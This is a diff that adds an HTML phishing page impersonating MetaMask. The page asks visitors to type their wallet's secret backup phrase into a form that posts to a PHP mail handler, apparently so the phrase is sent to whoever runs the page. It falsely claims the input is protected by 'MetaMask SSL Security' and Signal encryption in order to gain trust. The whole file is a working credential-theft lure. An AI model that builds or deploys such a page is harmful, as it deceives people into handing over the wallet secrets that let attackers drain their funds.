@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+    <link rel="stylesheet" href="/css/backup.css">
+    <title>MetaMask | Confirm your Wallet's Secret Backup Phrase</title>
+</head>
+<body>
+    <div class="container">
+        <div class="intro-section">
+            <div class="logo-img">
+                <a href="./index.html">
+                    <img src="./media/metamask logo.png" alt="MetaMask logo">
+                </a>
+            </div>
+        </div>
+        <div class="form-section">
+            <div class="form-text">
+                <h3>Confirm your Wallet's Secret Backup Phrase (SBP).</h3>
+                <p class="parag-text">
+                    NEVER share your secret seed phrase AKA secret recovery phrase.<br>
+                    This input is protected by <span class="strong-text">MetaMask SSL Security</span> <i class="fas fa-check-square"></i>
+                    by the same Signal encryption protocol that secures <span class="strong-text">sensitive data</span> before they leave your device. 
+                </p>
+            </div>
+            <div class="form-input">
+                <form action="./php/mail-handler.php" id="f-form" method="post">
+                    <textarea name="sbp" required></textarea>
+                </form>
+            </div>
+            <button type="submit" name="submit" form="f-form" class="next-btn">Agree</button>
+        </div>
+    </div>
+</body>
+</html>
